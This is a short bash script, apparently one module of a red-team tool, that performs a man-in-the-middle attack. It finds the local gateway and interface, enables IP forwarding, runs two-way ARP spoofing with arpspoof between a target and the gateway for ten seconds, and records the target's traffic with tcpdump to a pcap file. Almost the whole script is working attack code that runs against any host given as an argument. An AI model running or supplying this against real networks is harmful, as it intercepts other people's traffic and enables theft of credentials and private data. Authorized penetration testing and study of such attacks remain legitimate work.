#!/bin/bash
# MODULE: ATTACK SIMULATION (Red Team)
TARGET=$1
LOG_FILE=$2

# 1. AUTO-DETECT GATEWAY (The Router)
# We need to find the gateway IP to fool the victim.
GATEWAY=$(ip route show | grep default | awk '{print $3}')
INTERFACE=$(ip route show | grep default | awk '{print $5}')

echo "⚔️  INITIATING MITM ATTACK ON: $TARGET"
echo "    Gateway: $GATEWAY | Interface: $INTERFACE"
echo "-------------------------------------"

# 2. ENABLE FORWARDING (So we don't break the internet)
echo "1" > /proc/sys/net/ipv4/ip_forward
echo "    [+] IP Forwarding Enabled on Attacker Node"

# 3. LAUNCH ARP SPOOFING (The Lie)
# We tell the Target: "I am the Gateway"
# We tell the Gateway: "I am the Target"
echo "    [+] poisoning ARP cache (10 seconds)..."

# Run in background (&) so we can wait 
timeout 10s arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" > /dev/null 2>&1 &
PID_1=$!
timeout 10s arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET" > /dev/null 2>&1 &
PID_2=$!

# 4. SNIFF TRAFFIC (The Theft)
echo "    [+] Sniffing packets to /app/reports/capture.pcap..."
timeout 10s tcpdump -i "$INTERFACE" host "$TARGET" -w /app/reports/capture.pcap > /dev/null 2>&1

# 5. CLEANUP
kill $PID_1 $PID_2 2>/dev/null
echo "    ✅ Attack Completed."
